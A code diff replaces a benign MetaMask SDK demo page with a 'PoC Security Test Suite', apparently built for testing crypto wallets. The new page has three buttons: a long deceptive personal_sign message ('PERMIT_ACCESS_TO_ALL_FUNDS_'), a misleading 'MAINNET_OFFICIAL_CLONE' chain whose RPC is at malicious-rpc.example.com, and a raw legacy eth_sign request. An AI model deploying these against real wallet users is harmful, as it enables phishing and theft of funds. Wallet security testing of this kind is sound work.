@@ -2,83 +2,52 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vite React MMSDK Example (Full Functional)</title>
+    <title>PoC Security Test Suite</title>
     <style>
-        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; padding: 20px; background: #fff; }
-        .info-box { border: 2px solid #5d3fd3; background: #eef2ff; padding: 15px; border-radius: 8px; width: 100%; max-width: 400px; margin-bottom: 20px; font-size: 13px; word-break: break-all; }
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; width: 100%; max-width: 400px; }
-        button { padding: 12px; border: none; border-radius: 6px; background: #7c3aed; color: white; font-weight: bold; cursor: pointer; transition: 0.2s; }
-        button:hover { background: #5b21b6; }
-        button:nth-last-child(1) { grid-column: span 2; }
+        body { font-family: sans-serif; background: #1a1a1a; color: #eee; padding: 20px; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; max-width: 500px; margin: auto; }
+        button { padding: 15px; border-radius: 8px; border: 1px solid #f00; background: #330000; color: #ff5555; cursor: pointer; font-weight: bold; }
+        #log { margin-top: 20px; background: #000; color: #0f0; padding: 10px; font-size: 11px; }
     </style>
 </head>
 <body>
-
-    <h2>Vite React MMSDK Example</h2>
-
-    <div class="info-box">
-        Connected chain: <span id="chainId">0x1</span><br>
-        Connected account: <span id="account">undefined</span><br>
-        Last request response: <span id="res" style="color: #5d3fd3;">none</span><br>
-        Connected: <span id="conn">false</span>
-    </div>
-
     <div class="grid">
-        <button onclick="run('requestAccounts')">Request Accounts</button>
-        <button onclick="run('eth_signTypedData_v4')">eth_signTypedData_v4</button>
-        <button onclick="run('personal_sign')">personal_sign</button>
-        <button onclick="run('sendTransaction')">Send transaction</button>
-        <button onclick="run('switchGoerli')">Switch to Goerli</button>
-        <button onclick="run('switchPolygon')">Switch to Polygon</button>
-        <button onclick="run('addPolygon')">Add Polygon Chain</button>
-        <button onclick="run('readOnly')">readOnlyCalls</button>
-        <button onclick="run('requestPermissions')">requestPermissions</button>
+        <button onclick="spoof()">[1] UI Spoofing (Long String)</button>
+        
+        <button onclick="injectChain()">[2] Arbitrary Chain Injection</button>
+        
+        <button onclick="legacySign()">[3] Insecure eth_sign</button>
     </div>
+    <pre id="log">Status: Menunggu eksekusi...</pre>
 
     <script>
-        const el = (id) => document.getElementById(id);
+        const log = (m) => document.getElementById('log').innerText = m;
 
-        async function run(action) {
-            try {
-                let response = "Called " + action;
-                const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-                const currentAccount = accounts[0] || "undefined";
-                el('account').innerText = currentAccount;
-                el('conn').innerText = "true";
-                
-                switch(action) {
-                    case 'requestAccounts':
-                        const accs = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                        response = accs[0];
-                        break;
-                    case 'personal_sign':
-                        response = await window.ethereum.request({ method: 'personal_sign', params: ["0x48656c6c6f", currentAccount] });
-                        break;
-                    case 'sendTransaction':
-                        response = await window.ethereum.request({ method: 'eth_sendTransaction', params: [{ from: currentAccount, to: currentAccount, value: '0x0' }] });
-                        break;
-                    case 'switchGoerli':
-                        await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x5' }] });
-                        response = "Switched to Goerli";
-                        break;
-                    case 'switchPolygon':
-                        await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x89' }] });
-                        response = "Switched to Polygon";
-                        break;
-                    case 'addPolygon':
-                        await window.ethereum.request({ method: 'wallet_addEthereumChain', params: [{ chainId: '0x89', chainName: 'Polygon', rpcUrls: ['https://polygon-rpc.com'] }] });
-                        response = "Added Polygon";
-                        break;
-                    case 'readOnly':
-                        response = await window.ethereum.request({ method: 'eth_blockNumber' });
-                        break;
-                    case 'requestPermissions':
-                        response = await window.ethereum.request({ method: 'wallet_requestPermissions', params: [{ eth_accounts: {} }] });
-                        break;
-                }
-                el('res').innerText = response;
-            } catch (err) { el('res').innerText = "Error: " + err.code; }
+        async function spoof() {
+            const accs = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            // Mengirim pesan sangat panjang untuk menguji truncation/spoofing
+            const longMsg = "0x" + "PERMIT_ACCESS_TO_ALL_FUNDS_".repeat(20);
+            log("Spoofing: Mengirim pesan panjang untuk uji UI Truncation...");
+            await window.ethereum.request({ method: 'personal_sign', params: [longMsg, accs[0]] });
+        }
+
+        async function injectChain() {
+            log("Injection: Meminta penambahan chain menyesatkan...");
+            await window.ethereum.request({
+                method: 'wallet_addEthereumChain',
+                params: [{
+                    chainId: '0x1337',
+                    chainName: 'MAINNET_OFFICIAL_CLONE', // Nama menyesatkan
+                    rpcUrls: ['https://malicious-rpc.example.com'],
+                }]
+            });
+        }
+
+        async function legacySign() {
+            const accs = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            log("Insecure: Menggunakan eth_sign (metode lama)...");
+            // Mengirim data raw agar dompet kesulitan memberi konteks
+            await window.ethereum.request({ method: 'eth_sign', params: [accs[0], "0xdeadbeef"] });
         }
     </script>
 </body>
